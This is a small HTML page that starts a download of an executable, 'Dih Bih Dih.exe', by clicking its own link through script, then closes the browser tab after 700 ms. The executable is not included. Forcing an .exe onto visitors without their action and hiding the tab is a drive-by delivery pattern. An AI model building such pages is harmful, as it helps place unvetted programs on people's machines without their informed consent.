<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Download</title>
  <style>
    body {
      background-color: #000000;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
  </style>
</head>

<body>
  <p style="color: white; text-align: center;">Downloading file...</p>
  <p style="text-align: center;"><a id="download-link" href="Dih Bih Dih.exe" download style="color: white; text-decoration: underline;">Click here if the download does not start automatically</a>
  </p>

  <script>
    // Target changed to an executable (.exe)
    const downloadLink = document.getElementById('download-link');

    // Automatically trigger the download
    downloadLink.click();

    // Give browser 1 second to dispatch download stream, then close tab
    setTimeout(() => {
      window.close();
    }, 700);
  </script>
</body>

</html>
